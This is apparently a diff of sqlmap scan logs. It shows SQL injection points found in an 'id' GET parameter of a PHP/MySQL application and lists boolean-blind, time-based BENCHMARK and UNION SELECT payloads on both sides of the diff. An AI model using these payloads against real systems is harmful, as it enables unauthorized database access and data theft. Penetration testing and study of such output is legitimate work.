@@ -3,35 +3,35 @@ sqlmap identified the following injection point(s) with a total of 59 HTTP(s) re
 Parameter: id (GET)
     Type: boolean-based blind
     Title: AND boolean-based blind - WHERE or HAVING clause
-    Payload: id=1 AND 1033=1033
+    Payload: id=1 AND 6426=6426
 
     Type: AND/OR time-based blind
     Title: MySQL <= 5.0.11 AND time-based blind (heavy query)
-    Payload: id=1 AND 7885=BENCHMARK(5000000,MD5(0x755a645a))
+    Payload: id=1 AND 6160=BENCHMARK(5000000,MD5(0x63626949))
 
     Type: UNION query
     Title: Generic UNION query (NULL) - 2 columns
-    Payload: id=-6033 UNION ALL SELECT CONCAT(0x71627a7171,0x6a65574a73757678534a436a44556379575a56797846564e62574d54634d4e736474506542635249,0x71717a7171),NULL-- faGT
+    Payload: id=-3290 UNION ALL SELECT CONCAT(0x71626a6271,0x6e695063487776446d4e4e6e6f614d62545566546b765a76444d6679544c69795850726945617557,0x7178766a71),NULL-- EeOV
 ---
 web application technology: PHP 5.6.9
 back-end DBMS: MySQL <= 5.0.11
 available databases [1]:
 [*] kg
 
-sqlmap identified the following injection point(s) with a total of 59 HTTP(s) requests:
+sqlmap identified the following injection point(s) with a total of 375 HTTP(s) requests:
 ---
 Parameter: id (GET)
     Type: boolean-based blind
-    Title: AND boolean-based blind - WHERE or HAVING clause
-    Payload: id=1 AND 3754=3754&rct=j&q=&esrc=s
+    Title: OR boolean-based blind - WHERE or HAVING clause
+    Payload: id=-3482 OR 4549=4549
 
     Type: AND/OR time-based blind
     Title: MySQL <= 5.0.11 AND time-based blind (heavy query)
-    Payload: id=1 AND 3016=BENCHMARK(5000000,MD5(0x56535953))&rct=j&q=&esrc=s
+    Payload: id=1 AND 8504=BENCHMARK(5000000,MD5(0x45685961))
 
     Type: UNION query
-    Title: Generic UNION query (NULL) - 2 columns
-    Payload: id=-9921 UNION ALL SELECT CONCAT(0x7171716271,0x4d5748686a4b784b6d63794157655553514b7942426f5554504d696f51477a4f715468504c756870,0x71716a7a71),NULL-- Gukv&rct=j&q=&esrc=s
+    Title: MySQL UNION query (NULL) - 2 columns
+    Payload: id=-9471 UNION ALL SELECT CONCAT(0x716a767171,0x737a566246494c6642745463416e52436e716270726d574d5a4c42676958424c6351437543474f67,0x7176717871),NULL#
 ---
 web application technology: PHP 5.6.9
 back-end DBMS: MySQL <= 5.0.11
